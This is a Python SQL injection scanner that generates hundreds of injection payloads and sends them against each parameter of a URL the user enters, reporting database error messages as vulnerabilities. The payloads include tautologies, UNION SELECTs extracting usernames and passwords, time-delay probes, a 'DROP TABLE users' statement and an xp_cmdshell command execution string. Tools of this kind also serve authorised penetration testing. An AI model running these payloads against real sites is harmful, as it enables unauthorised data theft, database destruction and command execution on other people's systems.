import requests
import itertools

# Base payload parts to combine
base_payloads = [
    "'", "\"", "')", "\"))", "admin' --", "' OR '1'='1", "' OR 1=1 --", 
    "' OR 'a'='a", "' UNION SELECT NULL--", "' WAITFOR DELAY '0:0:5' --", 
    "'; DROP TABLE users; --", "' OR sleep(5)--", "' OR '1'='1' /*"
]

comments = ["--", "#", "/*"]
logical_ops = ["OR", "AND"]
comparisons = ["=", "!=", "<>", ">", "<", ">=", "<="]
values = ["1", "true", "false", "'1'", "'a'", "'test'"]
union_selects = [
    "NULL", "NULL,NULL", "username,password", "table_name,column_name"
]
time_delays = [
    "WAITFOR DELAY '0:0:5'",
    "SLEEP(5)",
    "BENCHMARK(1000000,MD5('test'))"
]

def generate_payloads():
    payloads = set()
    
    # Add base payloads directly
    payloads.update(base_payloads)
    
    # Generate tautology payloads
    for op in logical_ops:
        for comp in comparisons:
            for val1 in values:
                for val2 in values:
                    p = f"' {op} {val1} {comp} {val2} --"
                    payloads.add(p)
    
    # Union select payloads
    for usize in range(1, 4):
        combos = itertools.combinations_with_replacement(union_selects, usize)
        for combo in combos:
            select_str = ",".join(combo)
            payloads.add(f"' UNION SELECT {select_str} --")
            payloads.add(f"' UNION ALL SELECT {select_str} --")
    
    # Time delay payloads
    for delay in time_delays:
        payloads.add(f"' OR {delay} --")
        payloads.add(f"' {delay} --")
    
    # Comment variations with tautology
    for comment in comments:
        payloads.add(f"' OR '1'='1' {comment}")
        payloads.add(f"' OR 1=1 {comment}")
        payloads.add(f"' {comment}")
    
    # Misc additional patterns
    misc = [
        "'; EXEC xp_cmdshell('ping 10.10.1.2') --",
        "' AND ASCII(SUBSTRING((SELECT user()),1,1)) > 64 --",
        "' OR EXISTS(SELECT * FROM users)--",
        "' GROUP BY CONCAT(username, password)--",
        "' HAVING 1=1 --",
        "' OR SLEEP(10) --",
    ]
    payloads.update(misc)
    
    return list(payloads)

payloads = generate_payloads()

sql_errors = [
    "you have an error in your sql syntax",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "mysql_fetch",
    "sql syntax",
    "ORA-01756",
    "ODBC SQL",
    "SQLSTATE",
    "mysql_num_rows()",
    "input string was not in a correct format"
]

def is_vulnerable(response_text):
    for error in sql_errors:
        if error.lower() in response_text.lower():
            return True
    return False

def test_sql_injection(url):
    print(f"[+] Testing URL: {url}")
    if "?" not in url:
        print("[-] URL has no parameters to test.")
        return

    base_url, params = url.split("?", 1)
    param_pairs = params.split("&")

    for i in range(len(param_pairs)):
        key, value = param_pairs[i].split("=")
        for payload in payloads:
            test_params = param_pairs.copy()
            test_params[i] = f"{key}={payload}"
            test_url = base_url + "?" + "&".join(test_params)
            print(f"  -> Trying payload: {payload}")
            try:
                response = requests.get(test_url, timeout=5)
                if is_vulnerable(response.text):
                    print(f"[!!!] SQL Injection vulnerability detected with payload: {payload}")
                    print(f"      Vulnerable URL: {test_url}")
                    return
            except requests.RequestException as e:
                print(f"  [!] Request error: {e}")
    print("[-] No obvious SQL injection vulnerabilities detected.")

if __name__ == "__main__":
    target_url = input("Enter URL with parameters (e.g., http://example.com/page.php?id=1): ")
    test_sql_injection(target_url)
